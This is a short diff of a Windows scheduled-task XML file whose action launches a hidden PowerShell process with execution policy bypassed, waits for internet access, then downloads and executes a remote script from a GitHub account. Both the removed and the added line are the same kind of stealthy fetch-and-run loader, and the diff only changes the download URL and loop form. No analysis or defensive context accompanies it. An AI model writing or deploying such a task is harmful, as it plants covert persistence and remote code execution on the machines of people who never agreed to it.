@@ -48,7 +48,7 @@
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "while ($true) { if (Test-Connection -ComputerName google.com -Count 1 -Quiet) { IEX (New-Object Net.WebClient).DownloadString('https://github.com/cyberforce49/s/raw/refs/heads/main/rax.ps1'); break } else { Start-Sleep -Seconds 5 } }"</Arguments>
+      <Arguments>-WindowStyle Hidden -Exec Bypass -NonInteractive -Command "while (-not (Test-Connection www.google.com -Count 1 -Quiet)) {Start-Sleep -Seconds 5}; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberforce49/s/refs/heads/main/rax.ps1')"</Arguments>
     </Exec>
   </Actions>
 </Task>
